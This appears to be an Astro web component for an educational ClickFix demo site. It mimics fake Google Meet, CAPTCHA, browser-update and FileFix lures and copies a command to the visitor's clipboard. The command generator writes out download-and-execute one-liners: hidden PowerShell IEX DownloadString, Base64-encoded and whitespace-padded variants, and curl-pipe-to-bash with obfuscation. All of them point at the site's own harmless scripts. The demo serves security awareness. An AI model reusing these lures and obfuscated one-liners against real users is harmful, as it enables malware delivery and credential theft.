---
const baseUrl = import.meta.env.PROD
  ? "https://clickfix.fyi"
  : "http://localhost:4321";

// We reuse the existing benign scripts for "real" execution
const SAFE_SCRIPT_WIN = `${baseUrl}/static/example.ps1`;
const SAFE_SCRIPT_UNIX = `${baseUrl}/static/example.sh`;
---

<div class="demo-wrapper" id="interactive-demo" data-base-url={baseUrl}>
  <!-- Controls -->
  <div class="demo-controls card">
    <div class="control-group">
      <label for="scenario-select">Lure Scenario:</label>
      <select id="scenario-select">
        <option value="meet">Google Meet (Connection Error)</option>
        <option value="captcha">Fake CAPTCHA (Verify Human)</option>
        <option value="browser">Browser Update (Security Fix)</option>
        <option value="filefix">FileFix (Explorer Error)</option>
      </select>
    </div>

    <div class="control-group">
      <label for="platform-select">Platform:</label>
      <select id="platform-select">
        <option value="windows">Windows (PowerShell)</option>
        <option value="mac">macOS (Terminal)</option>
        <option value="linux">Linux (Bash)</option>
      </select>
    </div>

    <div class="control-group">
      <label for="tech-level-select">Obfuscation Level:</label>
      <select id="tech-level-select">
        <option value="1">Level 1: Clear Text (Basic)</option>
        <option value="2">Level 2: Obfuscated (Base64/Hidden)</option>
        <option value="3">Level 3: Stealth (Padding/Tricks)</option>
      </select>
    </div>
  </div>

  <!-- Simulation Stage -->
  <div class="demo-stage card" id="demo-stage-1">
    
    <!-- Scenario: Google Meet -->
    <div class="scenario-ui hidden" id="ui-meet">
      <div class="fake-notification meet-style">
        <div class="notif-header">
          <img src="https://www.google.com/favicon.ico" alt="Google" width="16" height="16" />
          <span>Google Meet</span>
        </div>
        <div class="notif-body">
          <h4>Connection Error</h4>
          <p>A technical issue occurred. Please fix to join the meeting:</p>
          <div class="fake-instruction" id="instr-meet"></div>
          <button class="btn-fake-copy action-btn">Fix Connection</button>
        </div>
      </div>
    </div>

    <!-- Scenario: Fake CAPTCHA -->
    <div class="scenario-ui hidden" id="ui-captcha">
      <div class="fake-captcha captcha-style">
        <div class="captcha-box">
          <input type="checkbox" id="fake-checkbox" />
          <label for="fake-checkbox">I'm not a robot</label>
          <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" class="captcha-logo"/>
        </div>
        <div class="captcha-instructions hidden" id="captcha-step-2">
           <p><strong>Verification Steps:</strong></p>
           <div class="fake-instruction" id="instr-captcha"></div>
           <button class="btn-fake-copy action-btn">Verify Now</button>
        </div>
      </div>
    </div>

    <!-- Scenario: Browser Update -->
    <div class="scenario-ui hidden" id="ui-browser">
        <div class="browser-alert">
            <div class="alert-icon">‚ö†Ô∏è</div>
            <div class="alert-content">
                <h3>Security Update Required</h3>
                <p>Your browser is missing a critical security patch (CVE-2025-X).</p>
                <div class="fake-instruction" id="instr-browser"></div>
                <button class="btn-fake-copy action-btn">Update Now</button>
            </div>
        </div>
    </div>

    <!-- Scenario: FileFix -->
    <div class="scenario-ui hidden" id="ui-filefix">
        <div class="explorer-window">
            <div class="explorer-bar">
                <span>üìÅ This PC > Documents > Secret.pdf</span>
            </div>
            <div class="explorer-body">
                <div class="error-dialog">
                    <h5>File System Error</h5>
                    <p>File cannot be displayed. Paste the fix below into the address bar.</p>
                    <div class="fake-instruction" id="instr-filefix"></div>
                    <button class="btn-fake-copy action-btn">Copy Fix Path</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Explanation Box -->
    <div class="demo-explanation hidden" id="explanation-box">
        <h4>üö® What just happened?</h4>
        <p>You copied this <strong>SAFE</strong> educational command:</p>
        <div class="payload-display">
            <code id="payload-code"></code>
        </div>
        <div class="alert-box">
            <strong>‚ö†Ô∏è Reality Check:</strong> If this were real malware, it would have just stolen your passwords.
            <br>
            <em id="safe-note" style="font-size: 0.9em; color: #059669;">(Note: The command above mimics real techniques but runs a harmless localized script.)</em>
        </div>
    </div>

  </div>
</div>

<style>
  .demo-wrapper {
    max-width: 900px;
    margin: 0 auto;
  }
  
  .demo-controls {
    display: flex;
    flex-wrap: wrap;
    gap: 1.5rem;
    padding: 1.5rem;
    margin-bottom: 2rem;
    background: #f8fafc;
    border: 1px solid #e2e8f0;
  }

  .control-group {
    flex: 1;
    min-width: 200px;
  }
  
  .control-group label {
    display: block;
    font-size: 0.85rem;
    font-weight: 600;
    margin-bottom: 0.5rem;
    color: #475569;
  }
  
  select {
    width: 100%;
    padding: 0.5rem;
    border: 1px solid #cbd5e1;
    border-radius: 4px;
    background: white;
  }

  .demo-stage {
    padding: 3rem;
    min-height: 400px;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: flex-start;
  }

  .scenario-ui {
    width: 100%;
    max-width: 500px;
    margin-bottom: 2rem;
  }

  .hidden { display: none !important; }

  /* Google Meet Style */
  .meet-style {
    background: white;
    border-radius: 8px;
    box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
    overflow: hidden;
    border: 1px solid #e5e7eb;
  }
  .notif-header {
    background: #f1f3f4;
    padding: 0.75rem 1rem;
    display: flex;
    align-items: center;
    gap: 0.5rem;
    font-weight: 500;
    font-size: 0.9rem;
  }
  .notif-body { padding: 1.5rem; }
  .notif-body h4 { color: #d93025; margin: 0 0 1rem 0; font-size: 1.1rem; }

  /* CAPTCHA Style */
  .captcha-style {
    background: #f9f9f9;
    border: 1px solid #d3d3d3;
    padding: 1rem;
    border-radius: 4px;
    width: 300px;
    margin: 0 auto;
    background: white;
    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
  }
  .captcha-box {
    display: flex;
    align-items: center;
    gap: 1rem;
    padding: 0.5rem;
  }
  .captcha-logo { width: 48px; height: 48px; margin-left: auto; }
  .captcha-instructions {
    margin-top: 1rem;
    border-top: 1px solid #eee;
    padding-top: 1rem;
  }

  /* Browser Alert Style */
  .browser-alert {
    background: #fff4f4;
    border: 1px solid #fecaca;
    border-radius: 6px;
    padding: 1.5rem;
    display: flex;
    gap: 1rem;
  }
  .alert-icon { font-size: 2rem; }
  .alert-content h3 { margin: 0 0 0.5rem 0; color: #991b1b; }

  /* Explorer Style */
  .explorer-window {
    border: 1px solid #94a3b8;
    background: white;
    border-radius: 4px;
    overflow: hidden;
    box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
  }
  .explorer-bar {
    background: #f1f5f9;
    padding: 0.5rem;
    font-size: 0.85rem;
    border-bottom: 1px solid #cbd5e1;
    color: #475569;
  }
  .explorer-body {
    padding: 2rem;
    background: #ffffff;
    display: flex;
    justify-content: center;
  }
  .error-dialog {
    border: 1px solid #cbd5e1;
    padding: 1.5rem;
    background: #f8fafc;
    width: 100%;
  }

  /* Shared Utility Styles */
  .fake-instruction {
    background: #1e293b;
    color: #e2e8f0;
    padding: 1rem;
    border-radius: 4px;
    margin: 1rem 0;
    font-family: monospace;
    font-size: 0.85rem;
    text-align: left;
  }
  .action-btn {
    width: 100%;
    padding: 0.75rem;
    background: #2563eb;
    color: white;
    border: none;
    border-radius: 4px;
    font-weight: 600;
    cursor: pointer;
  }
  .action-btn:hover { background: #1d4ed8; }

  .demo-explanation {
    margin-top: 2rem;
    width: 100%;
    border-top: 2px dashed #cbd5e1;
    padding-top: 2rem;
    animation: fadeIn 0.5s ease-out;
  }
  .payload-display {
    background: #111827;
    padding: 1rem;
    border-radius: 6px;
    color: #10b981;
    font-family: monospace;
    word-break: break-all;
    margin: 1rem 0;
    font-size: 0.85rem;
    overflow-x: auto;
  }
  .payload-display code {
    font-family: "Courier New", monospace;
    font-size: 0.85rem;
    color: #10b981;
    word-break: keep-all;
    white-space: pre;
    color: var(--accent-color);
    margin-top: 0;
  }
  .alert-box {
    background: #fecaca;
    color: #991b1b;
    padding: 1rem;
    border-radius: 6px;
    border: 1px solid #fca5a5;
  }

  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(10px); }
    to { opacity: 1; transform: translateY(0); }
  }
</style>

<script define:vars={{ SAFE_SCRIPT_WIN, SAFE_SCRIPT_UNIX }}>
  // State
  let state = {
    scenario: 'meet',
    platform: 'windows',
    level: '1'
  };

  // DOM Elements
  const els = {
    scenarioSelect: document.getElementById('scenario-select'),
    platformSelect: document.getElementById('platform-select'),
    levelSelect: document.getElementById('tech-level-select'),
    scenarios: {
      meet: document.getElementById('ui-meet'),
      captcha: document.getElementById('ui-captcha'),
      browser: document.getElementById('ui-browser'),
      filefix: document.getElementById('ui-filefix')
    },
    instr: {
      meet: document.getElementById('instr-meet'),
      captcha: document.getElementById('instr-captcha'),
      browser: document.getElementById('instr-browser'),
      filefix: document.getElementById('instr-filefix')
    },
    explBox: document.getElementById('explanation-box'),
    payloadCode: document.getElementById('payload-code'),
    fakeCheckbox: document.getElementById('fake-checkbox'),
    captchaStep2: document.getElementById('captcha-step-2'),
    copyBtns: document.querySelectorAll('.btn-fake-copy')
  };

  // Logic to build the payload
  function getPayload() {
    const isWin = state.platform === 'windows';
    const level = parseInt(state.level);
    
    // Windows Payloads
    if (isWin) {
      const basicCmd = `powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('${SAFE_SCRIPT_WIN}')"`;
      
      if (level === 1) return basicCmd;
      
      if (level === 2) {
        // Simple Base64 Obfuscation
        const bytes = new TextEncoder().encode(basicCmd);
        const b64 = btoa(String.fromCharCode(...bytes));
        return `powershell -Enc ${b64}`;
      }
      
      if (level === 3) {
        // "Stealth" padding - simulating whitespace padding
        return `powershell                                                                                                                                                                                                                                                                                                                                                                                          -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('${SAFE_SCRIPT_WIN}')"`;
      }
    } 
    // Mac/Linux Payloads
    else {
      const basicCmd = `curl -s ${SAFE_SCRIPT_UNIX} | bash`;
      
      if (level === 1) return basicCmd;
      
      if (level === 2) {
        // Base64 pipeline
        const b64 = btoa(basicCmd);
        return `echo "${b64}" | base64 -d | sh`;
      }
      
      if (level === 3) {
        // Obfuscated curl with backslashes
        return `c\\u\\r\\l -s ${SAFE_SCRIPT_UNIX} | b\\a\\s\\h`;
      }
    }
    return "Error generating payload";
  }

  function getInstructions() {
    const isWin = state.platform === 'windows';
    
    if (state.scenario === 'filefix') {
        return `1. Click the address bar above<br>2. Paste (Ctrl+V)<br>3. Press Enter`;
    }

    if (isWin) {
      return `1. Press <strong>Win + R</strong><br>2. Paste (Ctrl + V)<br>3. Press Enter`;
    } else {
      return `1. Open Terminal (Cmd + Space, type "Terminal")<br>2. Paste (Cmd + V)<br>3. Press Enter`;
    }
  }

  // Update UI
  function update() {
    // 1. Show active scenario
    Object.values(els.scenarios).forEach(el => el.classList.add('hidden'));
    els.scenarios[state.scenario].classList.remove('hidden');

    // 2. Update instructions text
    const text = getInstructions();
    Object.values(els.instr).forEach(el => el.innerHTML = text);

    // 3. Reset specific states
    els.captchaStep2.classList.add('hidden');
    if (els.fakeCheckbox) els.fakeCheckbox.checked = false;
    els.explBox.classList.add('hidden');
  }

  // Event Listeners
  els.scenarioSelect.addEventListener('change', e => { state.scenario = e.target.value; update(); });
  els.platformSelect.addEventListener('change', e => { state.platform = e.target.value; update(); });
  els.levelSelect.addEventListener('change', e => { state.level = e.target.value; update(); });

  // Special CAPTCHA logic
  els.fakeCheckbox?.addEventListener('change', () => {
    setTimeout(() => els.captchaStep2.classList.remove('hidden'), 500);
  });

  // Handle Copy Action
  els.copyBtns.forEach(btn => {
    btn.addEventListener('click', async () => {
      const payload = getPayload();
      
      try {
        await navigator.clipboard.writeText(payload);
        const originalText = btn.innerText;
        btn.innerText = "Copied! (Now Paste It)";
        btn.style.background = "#059669";
        
        // Show explanation
        els.payloadCode.innerText = payload;
        els.explBox.classList.remove('hidden');

        setTimeout(() => {
          btn.innerText = originalText;
          btn.style.background = "";
        }, 2000);
      } catch (err) {
        console.error("Copy failed", err);
      }
    });
  });

  // Init
  // Auto-detect Mac
  if (navigator.platform.toUpperCase().indexOf('MAC') >= 0) {
    state.platform = 'mac';
    els.platformSelect.value = 'mac';
  }
  update();

</script>
